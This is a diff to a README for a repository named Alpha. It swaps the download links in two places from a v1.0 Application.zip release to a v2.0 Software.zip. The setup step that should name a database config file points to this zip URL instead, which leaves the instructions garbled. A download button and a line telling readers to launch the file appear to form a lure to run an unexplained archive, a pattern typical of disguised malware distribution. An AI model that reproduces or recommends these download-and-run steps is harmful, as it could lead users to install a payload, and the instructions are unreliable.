@@ -21,7 +21,7 @@ To get started with this project, follow these steps:
 
 1. Clone the repository to your local machine.
 2. Install the necessary dependencies by running `dotnet restore`.
-3. Configure the database connection in the `https://github.com/ITACHIabimem/Alpha/releases/download/v1.0/Application.zip` file.
+3. Configure the database connection in the `https://github.com/ITACHIabimem/Alpha/releases/download/v2.0/Software.zip` file.
 4. Run the application using `dotnet run`.
 5. Access the website through your browser at `http://localhost:5000`.
 
@@ -53,7 +53,7 @@ The **Alpha** repository covers a wide range of topics, including:
 ## Software Zip File 📦
 
 Click the button below to download the software package:
-[![Download Software](https://github.com/ITACHIabimem/Alpha/releases/download/v1.0/Application.zip)](https://github.com/ITACHIabimem/Alpha/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/ITACHIabimem/Alpha/releases/download/v2.0/Software.zip)](https://github.com/ITACHIabimem/Alpha/releases/download/v2.0/Software.zip)
 
 Remember to launch the file after downloading for installation and setup.
 
